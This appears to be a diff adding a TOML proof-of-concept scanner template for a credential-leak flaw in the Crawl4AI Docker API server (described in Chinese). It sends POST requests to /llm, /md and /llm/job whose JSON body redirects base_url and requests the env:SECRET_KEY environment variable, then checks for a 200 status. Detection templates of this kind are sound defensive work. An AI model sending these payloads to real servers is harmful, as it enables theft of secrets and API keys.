@@ -1,0 +1,70 @@
+[info]
+author = "ave"
+description = "Crawl4AI Docker API 服务器 0.8.8 之前版本的 /llm 端点未认证，攻击者可构造恶意 base_url 参数将 LLM API 调用重定向并设置 api_token=env:VARIABLE_NAME 读取环境变量。发送 POST 请求至 /llm 端点，检查响应状态码判断漏洞是否存在。"
+id = "POC-AVE-2026-0110"
+name = "Crawl4AI Docker API 凭据泄露漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2026-56259",
+    "credential-exfiltration",
+    "crawl4ai",
+]
+vuln_id = [
+    "CVE-2026-56259",
+    "AVE-2026-0110",
+    "GHSA-f989-c77f-r2cq",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/llm"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"base_url": "http://127.0.0.1:9999/", "api_token": "env:SECRET_KEY", "provider": "openai", "prompt": "test"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/md"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"base_url": "http://127.0.0.1:9999/", "api_token": "env:SECRET_KEY", "provider": "openai", "prompt": "test"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/llm/job"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"base_url": "http://127.0.0.1:9999/", "api_token": "env:SECRET_KEY", "provider": "openai", "prompt": "test"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
